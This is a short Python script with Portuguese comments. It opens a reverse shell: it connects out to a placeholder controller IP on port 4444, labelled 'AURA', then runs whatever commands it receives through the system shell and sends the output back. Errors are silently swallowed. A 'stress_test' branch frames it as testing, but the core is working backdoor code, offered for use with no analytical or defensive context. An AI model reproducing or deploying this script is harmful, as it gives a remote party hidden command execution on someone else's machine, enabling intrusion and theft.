import socket
import subprocess
import os

def connect_to_aura():
    MY_AURA_IP = "SEU_IP_AQUI" # O IP da sua máquina no TRF
    PORT = 4444
    
    s = socket.socket()
    try:
        s.connect((MY_AURA_IP, PORT))
        while True:
            # Recebe o comando do AURA
            comando = s.recv(1024).decode()
            if comando.lower() == "stress_test":
                # Roda a lógica de abrir abas, ler pastas, etc.
                # E envia o log de volta
                s.send(b"Teste de Stress iniciado no Alvo...")
            elif comando.lower() == "exit":
                break
            else:
                # Executa comandos de sistema (quem sou eu, ipconfig, etc)
                op = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(op.stdout.read() + op.stderr.read())
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    connect_to_aura()
